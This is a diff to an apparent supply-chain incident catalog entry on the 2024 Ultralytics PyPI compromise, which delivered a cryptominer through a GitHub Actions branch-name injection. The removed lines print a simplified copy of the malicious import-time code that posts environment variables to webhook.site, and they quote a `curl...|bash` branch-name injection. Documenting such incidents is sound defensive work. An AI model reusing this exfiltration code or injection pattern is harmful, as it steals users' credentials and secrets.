@@ -1,74 +1,21 @@
 - name: ultralytics
-  title: Ultralytics GitHub Actions compromised, published crypto miner.
-  start_date: 2024-12-04 # First malicious version published
-  end_date: 2024-12-07 # Last malicious version published/discovered
-  license: AGPL-3.0
-  website: https://ultralytics.com/
-  repo: https://github.com/ultralytics/ultralytics
-  attribution_type: unknown
-  component_type: Library # ML Library/Framework
-  lang: Python # Payload language
-  cause: compromise # CI/CD pipeline exploit
-  motive: financial gain / credential theft
-  attack_vector: CI/CD pipeline exploit # GitHub Actions script injection via branch name
-  transitive: false
-  insertion_phase: CI/CD # Malicious code injected during build/release via compromised pipeline
-  impact_type: cryptomining / credential theft
-  impact_user_count: 5000 # Conservative estimate based on downloads during the windows
+  title: Ultralytics PyPI package compromised distributing cryptominer
+  synopsis: Attackers exploited a vulnerability in the project's GitHub Actions CI/CD workflow (combining `pull_request_target` trigger with command injection via unsanitized branch names). This allowed them to execute arbitrary code during the build/publish process and upload malicious versions of the official `ultralytics` package directly to PyPI. These compromised versions contained an XMRig cryptominer. Several malicious versions were published over a few days before being detected and removed.
+  start_date: 2024-12-04 # Date first malicious version (8.3.41) published to PyPI
+  end_date: 2024-12-07 # Date last malicious version (8.3.46) published (discovery/remediation occurred shortly after)
+  attribution_type: Unknown
+  component_type: Library # AI/ML Computer Vision
+  lang: Python # Package is Python; payload was a binary cryptominer
+  cause: CI/CD Exploit # GitHub Actions workflow vulnerability exploited
+  motive: Financial gain # Cryptomining
+  insertion_phase: CI/CD # Malicious code injected during build/publish pipeline, artifact uploaded to PyPI
+  impact_type: Resource hijacking, Cryptomining
   references:
-    - https://hiddenlayer.com/innovation-hub/ultralytics-python-package-compromise-deploys-cryptominer/ # Detailed analysis
-    - https://snyk.io/blog/ultralytics-ai-pwn-request-supply-chain-attack/ # Attack flow details
-    - https://www.legitsecurity.com/blog/the-ultralytics-supply-chain-attack-how-it-happened-how-to-prevent # Prevention focus
-    - https://github.com/ultralytics/ultralytics/issues/18023 # User report issue
-    - https://safetycli.com/research/supply-chain-attack-ultralytics-ai # Impact analysis
+    - https://www.legitsecurity.com/blog/the-ultralytics-supply-chain-attack-how-it-happened-how-to-prevent # Legit Security Blog detailing the attack vector
+    - https://safetycli.com/research/supply-chain-attack-ultralytics-ai # Safety CLI Blog detailing timeline and versions
+    - https://github.com/ultralytics/ultralytics/issues/18029 # GitHub issue discussing the incident
   versions: # Malicious versions published to PyPI
-    - "8.3.41"
-    - "8.3.42"
-    - "8.3.45"
-    - "8.3.46"
-  artifacts:
-    - "PyPI package ultralytics versions 8.3.41, 8.3.42, 8.3.45, 8.3.46 (Malicious, now removed/superseded)"
-  synopsis: Attackers exploited a GitHub Actions workflow vulnerability in the Ultralytics project to inject malicious code into release packages. These compromised packages, published on PyPI, deployed cryptocurrency miners and exfiltrated credentials.
-  compromise_desc: Attackers exploited a vulnerability in an Ultralytics GitHub Actions workflow (`format.yml`) that used the insecure `pull_request_target` trigger combined with unescaped template expressions in dynamically created branch names (via PR #18018, #18020 by user `openimbot`). By crafting branch names containing shell commands (e.g., `$({curl...}|bash)`), they achieved arbitrary code execution within the privileged CI/CD pipeline runner. This allowed them to execute a malicious script (`file.sh`), which likely exfiltrated GitHub tokens and PyPI API keys, poisoned the build cache, and modified the package build process to include malicious code in the versions (8.3.41, 8.3.42) published to PyPI. After initial remediation by Ultralytics, the attacker apparently used the stolen PyPI credentials to directly upload further malicious versions (8.3.45, 8.3.46) bypassing the CI/CD pipeline.
-  impact_desc: Users who installed the compromised `ultralytics` versions (8.3.41, 8.3.42, 8.3.45, 8.3.46) from PyPI between December 4th and 7th, 2024, unknowingly executed malicious code. Versions 8.3.41/42 included modifications to `utils/downloads.py` and `models/yolo/model.py` that downloaded and executed an XMRig Monero cryptocurrency miner, consuming significant CPU resources (leading to some Google Colab account suspensions). Versions 8.3.45/46 contained malicious code directly in `__init__.py` that exfiltrated environment variables and current directory listings to attacker-controlled webhook endpoints (`webhook.site`).
-  example_code: |
-    # Malicious code from __init__.py in ultralytics v8.3.45 / v8.3.46
-    # (Simplified for clarity)
-    import os
-    import sys
-    import platform
-    import threading
-    import requests
-    import base64
-
-    def run_tasks():
-        try:
-            # Prepare data: environment variables and directory listing
-            environ_data = str(os.environ).encode()
-            list_dir_data = str(os.listdir('.')).encode()
-            payload = {
-                'environ': base64.b64encode(environ_data).decode(),
-                'listdir': base64.b64encode(list_dir_data).decode(),
-            }
-            # Determine target webhook based on OS
-            target_url = ""
-            if platform.system() == 'Linux':
-                target_url = 'https://webhook.site/[webhook_id_linux]' # Actual ID redacted
-            elif platform.system() == 'Darwin': # macOS
-                target_url = 'https://webhook.site/[webhook_id_macos]' # Actual ID redacted
-
-            if target_url:
-                requests.post(target_url, json=payload)
-        except Exception:
-            pass # Fail silently
-
-    # Run the malicious tasks in a separate thread upon import
-    try:
-        if os.getenv("ULTRALYTICS_INIT_RUN") != "1":
-            os.environ["ULTRALYTICS_INIT_RUN"] = "1"
-            task_thread = threading.Thread(target=run_tasks)
-            task_thread.start()
-    except Exception:
-        pass
-
-    # Original __init__.py content likely followed...
+    - 8.3.41
+    - 8.3.42
+    - 8.3.45
+    - 8.3.46
